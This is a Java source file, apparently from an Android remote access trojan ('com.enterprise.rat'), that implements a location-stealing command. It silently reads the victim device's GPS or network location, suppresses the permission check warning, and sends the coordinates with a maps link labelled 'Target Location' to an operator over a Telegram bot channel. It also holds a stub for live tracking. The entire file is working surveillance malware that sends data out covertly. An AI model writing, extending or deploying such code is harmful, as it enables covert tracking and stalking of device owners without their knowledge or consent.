package com.enterprise.rat.commands;

import android.annotation.SuppressLint;
import android.content.Context;
import android.location.Location;
import android.os.Looper;
import com.enterprise.rat.utils.TelegramApi;

public class LocationManager {
    private Context context;

    public LocationManager(Context context) { this.context = context; }

    @SuppressLint("MissingPermission")
    public void sendCurrentLocation() {
        android.location.LocationManager lm =
            (android.location.LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        Location loc = null;
        try {
            if (lm.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER))
                loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
            if (loc == null && lm.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER))
                loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);

            if (loc != null) {
                String mapUrl = "https://www.google.com/maps?q=" + loc.getLatitude() + "," + loc.getLongitude();
                TelegramApi.sendMessage("<b>📍 Target Location:</b>\n" +
                        "Lat: <code>" + loc.getLatitude() + "</code>\n" +
                        "Long: <code>" + loc.getLongitude() + "</code>\n" +
                        "<a href=\"" + mapUrl + "\">Open in Maps</a>");
            } else {
                TelegramApi.sendMessage("❌ Could not retrieve location. GPS might be OFF.");
            }
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Location Error: " + e.getMessage());
        }
    }

    public void startLiveGPS() {
        TelegramApi.sendMessage("📍 Live GPS tracking started (simplified)");
    }
}
